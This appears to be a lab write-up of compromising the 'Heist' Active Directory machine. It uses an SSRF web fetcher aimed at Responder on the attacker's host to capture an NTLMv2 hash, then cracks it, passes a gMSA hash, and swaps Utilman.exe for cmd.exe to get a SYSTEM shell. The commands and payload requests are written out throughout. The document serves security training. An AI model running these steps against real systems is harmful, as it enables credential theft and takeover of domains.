#Windows #ActiveDirectory #SSRF #NTLMCapture #Responder #WinRM #gMSA #SeRestorePrivilege #Utilman

## Overview

Heist is an Active Directory domain controller where a server-side web browser becomes an NTLM hash capture tool. Pointing the application's fetch functionality at Responder leaks the `enox` user's NTLMv2 hash, which cracks to a password. From there, BloodHound maps a path through a Group Managed Service Account: `enox` can read the gMSA password for `svc_apache$`, which holds SeRestorePrivilege. That privilege enables the Utilman.exe replacement trick, spawning a SYSTEM shell from the RDP login screen.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec)
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http          Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
```

The DC fingerprint (ports 88, 389, 636, 3268) confirms this is a domain controller. Port 8080 is unusual, it's a Python/Werkzeug web app titled "Super Secure Web Browser."

## Foothold

### NTLM Capture via SSRF Web Browser

The web app on port 8080 fetches URLs on behalf of the user. Testing with an HTTP server on Kali confirms outbound requests reach us. The application makes the request using Windows-native HTTP, which means it will attempt NTLM authentication when talking to a server that challenges for it.

Setting up Responder to capture the authentication:

```sh
sudo responder -I tun0
```

Submitting a URL pointing to Kali from the web browser causes the server to authenticate outbound, and Responder captures the NTLMv2 hash:

```
enox::HEIST:92881b21e5d93737:57A856863DD770799CBB68736080BA80:0101000000...
```

The raw Burp request confirms the fetch parameter:

```http
GET /?url=http://192.168.45.244/test HTTP/1.1
Host: 192.168.180.165:8080
```

> **How Responder captures NTLMv2:** when a Windows process connects to a UNC path or HTTP server that issues a 401 with `WWW-Authenticate: NTLM`, Windows automatically responds with an NTLMv2 challenge-response using the current user's credentials. Responder acts as the rogue server, issuing the challenge and recording the response. The captured blob isn't the password, it's a challenge-response derived from the NTLM hash, but it can be cracked offline with the same tools as any other hash.

Cracking with John:

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
california       (enox)
```

Credentials:

```
enox : ‹redacted›
```

WinRM access confirmed:

```sh
evil-winrm -u 'enox' -p 'california' -i 192.168.180.165
```

Local flag:

```powershell
*Evil-WinRM* PS C:\Users\enox\Desktop> type local.txt
‹redacted›
```

## Privilege Escalation

### BloodHound, gMSA Path

`enox`'s home directory has a `todo.txt` mentioning a group managed service account for Apache. WinPEAS produces nothing directly useful, so BloodHound maps the relationships:

- `svc_apache` is a gMSA (msDS-GroupManagedServiceAccount).
- Only members of the **Web Admins** group can retrieve its password.
- `enox` is a member of Web Admins.

Confirming with PowerShell:

```powershell
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
```

### Dumping the gMSA Password

GMSAPasswordReader extracts the NT hash for `svc_apache$`:

```powershell
*Evil-WinRM* PS C:\Users\enox\Documents> .\GMSAPasswordReader.exe --AccountName 'svc_apache'
Calculating hashes for Current Value
[*] Input username  : svc_apache$
[*]       rc4_hmac  : EA903FC3E46C88CFE2919D0C1CDC1162
```

> **What gMSA passwords are:** Group Managed Service Accounts have their passwords managed automatically by the domain controller and rotated on a schedule. The password is never set by a human, it's a 256-bit random blob. But the DC stores the current value encrypted in LDAP, and accounts with ReadGMSAPassword permission (here, Web Admins members) can retrieve the NT hash directly. That hash is pass-the-hashable with no cracking needed.

Authenticating as `svc_apache$` with the hash (the `$` suffix is required):

```sh
evil-winrm -i 192.168.180.165 -u svc_apache$ -H EA903FC3E46C88CFE2919D0C1CDC1162
```

### SeRestorePrivilege, Utilman Replacement

`svc_apache$` holds SeRestorePrivilege. This privilege allows writing to any file on the system regardless of the file's own ACL, including protected system binaries.

The Utilman.exe trick: replace the Accessibility Tools binary on the RDP login screen with `cmd.exe`. When clicked from the lock screen (before any authentication), it spawns as SYSTEM:

```powershell
mv C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.old
mv C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

> **Why SeRestorePrivilege allows this:** the privilege was designed to let backup software restore files to their original ACL-protected locations. It bypasses write permission checks on the destination file. An attacker with this privilege can overwrite any file the OS will execute with elevated rights, including accessibility helpers that run before login.

RDP into the box with `enox`'s credentials (using `rdesktop` since `xfreerdp` errors on this build), then click the Accessibility Tools icon at the bottom right of the lock screen.

## Root / SYSTEM

A CMD console spawns as SYSTEM directly from the lock screen:

```
proof.txt contents: ‹redacted›
```

## Takeaways

- **Web-fetch features are SSRF primitives.** Any application that fetches a URL on your behalf can be aimed at Responder to leak NTLM hashes. Test every URL input field.
- **BloodHound before manual enumeration.** The gMSA path was non-obvious from `net user` alone; BloodHound's attack path graph surfaced it in seconds.
- **SeRestorePrivilege is effectively SeDebugPrivilege-lite.** It bypasses ACLs on file writes, making it trivial to overwrite any system binary. Utilman.exe is the classic target but any SYSTEM-executed binary works.
